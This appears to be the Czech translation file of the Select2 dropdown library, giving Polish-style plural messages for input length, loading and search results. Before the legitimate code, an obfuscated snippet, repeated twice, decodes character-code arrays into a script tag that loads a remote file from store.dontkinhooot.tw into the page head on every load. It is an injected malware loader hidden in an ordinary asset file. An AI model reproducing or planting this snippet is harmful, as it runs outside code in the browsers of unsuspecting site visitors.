Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();define(function () {
  // Czech
  function small (count, masc) {
    switch(count) {
      case 2:
        return masc ? 'dva' : 'dvě';
      case 3:
        return 'tři';
      case 4:
        return 'čtyři';
    }
    return '';
  }
  return {
    errorLoading: function () {
      return 'Výsledky nemohly být načteny.';
    },
    inputTooLong: function (args) {
      var n = args.input.length - args.maximum;

      if (n == 1) {
        return 'Prosím zadejte o jeden znak méně';
      } else if (n <= 4) {
        return 'Prosím zadejte o ' + small(n, true) + ' znaky méně';
      } else {
        return 'Prosím zadejte o ' + n + ' znaků méně';
      }
    },
    inputTooShort: function (args) {
      var n = args.minimum - args.input.length;

      if (n == 1) {
        return 'Prosím zadejte ještě jeden znak';
      } else if (n <= 4) {
        return 'Prosím zadejte ještě další ' + small(n, true) + ' znaky';
      } else {
        return 'Prosím zadejte ještě dalších ' + n + ' znaků';
      }
    },
    loadingMore: function () {
      return 'Načítají se další výsledky…';
    },
    maximumSelected: function (args) {
      var n = args.maximum;

      if (n == 1) {
        return 'Můžete zvolit jen jednu položku';
      } else if (n <= 4) {
        return 'Můžete zvolit maximálně ' + small(n, false) + ' položky';
      } else {
        return 'Můžete zvolit maximálně ' + n + ' položek';
      }
    },
    noResults: function () {
      return 'Nenalezeny žádné položky';
    },
    searching: function () {
      return 'Vyhledávání…';
    }
  };
});
